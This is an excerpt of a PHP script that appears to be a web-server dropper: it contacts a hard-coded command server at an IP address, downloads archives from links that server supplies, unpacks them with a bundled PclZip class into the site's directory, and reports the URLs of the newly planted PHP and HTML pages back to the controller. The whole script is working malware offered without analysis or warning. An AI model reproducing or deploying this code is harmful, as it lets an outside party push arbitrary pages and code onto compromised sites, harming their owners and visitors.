...
$archives = curl_query(json_encode(['mode' => 'get_archives', 'operation_id' => 'not assigned', 'code' => '8003', 'domain' => $_SERVER['HTTP_HOST']]));

if($result = json_decode($archives, true)) {
	
	if(isset($result['status']) and $result['status'] == 'return_archives') {
		foreach($result['ids'] as $archive_id) {
			$download_link = curl_query(json_encode(['mode' => 'get_archive', 'operation_id' => $archive_id, 'code' => '8004', 'domain' => $_SERVER['HTTP_HOST']]));
			if($resp = json_decode($download_link, true)) {
				if(!file_exists(__DIR__.'/'.$archive_id)) {
					if(mkdir(__DIR__.'/'.$archive_id)) {
						
					} else {
						curl_query(json_encode(['operation_id' => $archive_id, 'code' => '9003', 'domain' => $_SERVER['HTTP_HOST']]));
					}
				}
				if(file_put_contents(__DIR__.'/'.$archive_id.'/'.$resp['name'], file_get_contents($resp['link']))) {
					curl_query(json_encode(['mode' => 'archive_downloaded', 'operation_id' => $archive_id, 'code' => '8005', 'status'=>1, 'domain' => $_SERVER['HTTP_HOST']]));
					
					$archive = new PclZip(__DIR__.'/'.$archive_id.'/'.$resp['name']);
					if($result = $archive->extract(__DIR__.'/'.$archive_id.'/')) {
						curl_query(json_encode(['mode' => 'archive_unpacking', 'operation_id' => $archive_id, 'code' => '8006', 'status'=>1, 'domain' => $_SERVER['HTTP_HOST']]));
						
						$ret = [];
						$dirs = search_urls($archive_id, $ret);
						$r = curl_query(json_encode(['mode' => 'saved_urls', 'operation_id' => $archive_id, 'code' => '8007', 'urls'=>json_encode($dirs), 'domain' => $_SERVER['HTTP_HOST']]));
						//($r);
					} else {
						curl_query(json_encode(['mode' => 'archive_unpacking', 'operation_id' => $archive_id, 'code' => '8006', 'status'=>0, 'domain' => $_SERVER['HTTP_HOST']]));
					}
				
				} else {
					curl_query(json_encode(['mode' => 'archive_downloaded', 'operation_id' => $archive_id, 'code' => '8005', 'status'=>0, 'domain' => $_SERVER['HTTP_HOST']]));
				}
				
				
			} else {
				echo 'Response: error, exit process...';
				die;
			}
		}
...
function search_urls($dir, &$ret) {
	if( isset($_SERVER['HTTPS'] ) ) {
		$http = 'https://';
	} else {
		$http = 'http://';
	}
	$base = str_replace(__DIR__.'/','',basename(__FILE__));
	
	$dirs = scandir(__DIR__.'/'.$dir);
	$dirs = array_diff($dirs,['.','..','.htaccess']);
	
	//pr($dirs);
	foreach($dirs as $di) {
		if(is_file(__DIR__.'/'.$dir.'/'.$di)) {
			if(in_array(getExtension($di),['php','html'])) {
				$ret[] = ['page' => $http.$_SERVER['HTTP_HOST'].str_replace($base,'',$_SERVER['REQUEST_URI']).$dir.'/'.$di];
			}
		}
		if(is_dir(__DIR__.'/'.$dir.'/'.$di)) {
			search_urls($dir.'/'.$di, $ret);
		}
	}
...
function curl_query($params = '') {
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,'http://188.138.71.67/server.php?a=dfUbnsdG8asdbn');
...
class PclZip
{
    ...
    public function privOptionDefaultThreshold(&$p_options)
    {
        ...
        $p_options['PCLZIP_OPT_TEMP_FILE_THRESHOLD'] = floor($v_memory_limit * 0.47);
    ...
    public function privAddFileUsingTempFile($p_filedescr, &$p_header, &$p_options)
    {
        ...
        // ----- Read the file by 2048 octets blocks
